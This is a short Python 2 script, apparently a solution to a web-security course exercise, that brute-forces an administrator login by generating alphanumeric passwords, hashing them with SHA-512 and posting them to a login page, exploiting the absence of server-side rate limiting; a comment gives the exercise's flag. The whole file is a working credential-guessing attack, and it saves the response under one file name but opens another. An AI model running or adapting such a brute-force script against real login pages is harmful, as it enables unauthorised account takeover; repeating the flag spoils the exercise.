import hashlib
import itertools
import webbrowser
from string import ascii_lowercase

import requests

# Exploit: there is no brute force checking on the server side,
# so we can try bruteforcing the password
# Flag is "hdls"

def iterate_string():
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    size = 4
    while True:
        for s in itertools.product(chars, repeat=size):
            yield "".join(s)
        size += 1

def main():
    # Iterate passwords
    for pw in iterate_string():
        hashed_pw = hashlib.sha512(pw).hexdigest()
        payload = {'email': 'admin@admin.com', 'password': '', 'p': hashed_pw}
        res = requests.post('http://wsb.com/Assignment2/case17/includes/process_login.php', data=payload)
        if "logged out" not in res.text:
            # import pdb; pdb.set_trace()
            with open('/tmp/case26.html', 'wb') as f:
                f.write(res.content)
            webbrowser.open('/tmp/case2.html', 2)
        print "pw is not {}".format(pw)

if __name__ == "__main__":
    main()
